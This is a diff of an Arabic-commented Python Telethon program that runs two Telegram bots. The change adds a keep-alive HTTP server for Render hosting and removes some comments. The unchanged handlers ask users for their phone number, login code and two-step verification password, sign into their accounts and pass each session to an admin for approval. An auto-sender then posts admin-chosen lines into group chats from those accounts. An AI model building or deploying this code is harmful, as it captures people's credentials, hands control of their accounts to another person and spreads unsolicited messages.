@@ -1,9 +1,27 @@
 import os
 import asyncio
+import threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from telethon import TelegramClient, events, Button
 import nest_asyncio
 
 nest_asyncio.apply()
+
+# --- خادم وهمي لإبقاء الخدمة المجانية شغالة على Render ---
+class HealthCheckHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Bot is Running!")
+
+def start_health_check_server():
+    port = int(os.environ.get("PORT", 8080))
+    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
+    server.serve_forever()
+
+# تشغيل خادم الصحة في مسار مستقل (Thread)
+threading.Thread(target=start_health_check_server, daemon=True).start()
+
 
 # --- الثوابت الأساسية ---
 API_ID = 21727
@@ -20,17 +38,15 @@ admin_custom_lines = [
     "الخط الساخن الثاني: النظام يعمل بكفاءة عالية"
 ]
 
-# --- تخزين حالات المستخدمين مؤقتاً ---
 user_sessions = {}
 pending_approvals = {}
 user_settings = {}
 
-# إنشاء كائنات البوتات
 admin_bot = TelegramClient('admin_bot_session', API_ID, API_HASH)
 client_bot = TelegramClient('client_bot_session', API_ID, API_HASH)
 
 
-# --- بوت التحكم (الإدارة) لإدارة السطور ---
+# --- بوت التحكم (الإدارة) ---
 @admin_bot.on(events.NewMessage(pattern='/lines'))
 async def manage_lines(event):
     if event.sender_id != ADMIN_ID:
@@ -56,7 +72,7 @@ async def manage_lines(event):
         await event.respond("❌ أمر غير معروف. استخدم `/lines` لعرض التعليمات.")
 
 
-# --- بوت العميل: طلب تسجيل الدخول ---
+# --- بوت العميل ---
 @client_bot.on(events.NewMessage(pattern='/start'))
 async def client_start(event):
     user_id = event.sender_id
@@ -68,7 +84,6 @@ async def client_start(event):
     user_sessions[user_id] = {"status": "waiting_phone"}
 
 
-# --- استقبال رقم الهاتف من المستخدم ---
 @client_bot.on(events.NewMessage(func=lambda e: e.is_private))
 async def handle_phone(event):
     user_id = event.sender_id
@@ -94,7 +109,6 @@ async def handle_phone(event):
         await event.respond(f"❌ حدث خطأ أثناء إرسال الكود: {e}")
 
 
-# --- استقبال كود التحقق وإرساله للأدمن للاعتماد ---
 @client_bot.on(events.NewMessage(func=lambda e: e.is_private))
 async def handle_code(event):
     user_id = event.sender_id
@@ -118,7 +132,7 @@ async def handle_code(event):
             if "Password" in str(sign_in_error) or "two-step" in str(sign_in_error):
                 data["code"] = code
                 user_sessions[user_id]["status"] = "waiting_password"
-                await event.respond("🔒 حسابك محمي التحقق بخطوتين (كلمة مرور السحابة). يرجى إرسال كلمة المرور الآن:")
+                await event.respond("🔒 حسابك محمي التحقق بخطوتين. يرجى إرسال كلمة المرور الآن:")
                 return
             else:
                 raise sign_in_error
@@ -136,7 +150,6 @@ async def handle_code(event):
         await event.respond(f"❌ خطأ في الكود أو تسجيل الدخول: {e}")
 
 
-# --- استقبال كلمة المرور للتحقق بخطوتين ---
 @client_bot.on(events.NewMessage(func=lambda e: e.is_private))
 async def handle_password(event):
     user_id = event.sender_id
@@ -156,7 +169,7 @@ async def handle_password(event):
         
         await admin_bot.send_message(
             ADMIN_ID,
-            f"🔔 **طلب تفعيل مستخدم جديد (مع تحقق بخطوتين):**\n- آيدي المستخدم: `{user_id}`\n- الرقم: `{data['phone']}`",
+            f"🔔 **طلب تفعيل مستخدم جديد:**\n- آيدي المستخدم: `{user_id}`\n- الرقم: `{data['phone']}`",
             buttons=[Button.inline(b"Accept Login", data=f"accept_login_{user_id}".encode())]
         )
         await event.respond("⏳ تم تسجيل الدخول بنجاح! بانتظار موافقة الإدارة.")
@@ -164,7 +177,6 @@ async def handle_password(event):
         await event.respond(f"❌ كلمة المرور غير صحيحة: {e}")
 
 
-# --- تفاعل الأدمن مع زر الموافقة ---
 @admin_bot.on(events.CallbackQuery(pattern=b"accept_login_"))
 async def admin_approve(event):
     if event.sender_id != ADMIN_ID:
@@ -190,7 +202,6 @@ async def admin_approve(event):
         await event.answer(f"حدث خطأ: {e}", alert=True)
 
 
-# --- أوامر التحكم الشخصية للمستخدم ---
 @client_bot.on(events.NewMessage(pattern=r'/speed (.+)'))
 async def set_speed(event):
     user_id = event.sender_id
@@ -214,7 +225,6 @@ async def set_trigger(event):
     await event.respond(f"🔑 تم تحديث الكلمة المفتاحية إلى: `{new_trig}`")
 
 
-# --- منطق العميل الآلي لإرسال السطور ---
 @client_bot.on(events.NewMessage(func=lambda e: e.is_private is False))
 async def auto_sender(event):
     user_id = event.sender_id
@@ -239,7 +249,7 @@ async def auto_sender(event):
             print(f"⚠️ خطأ أثناء الإرسال الآلي: {e}")
 
 
-# --- دالة التشغيل الرئيسية المحدثة ---
+# --- دالة التشغيل الرئيسية ---
 async def main():
     await admin_bot.start(bot_token=ADMIN_BOT_TOKEN)
     await client_bot.start(bot_token=CLIENT_BOT_TOKEN)
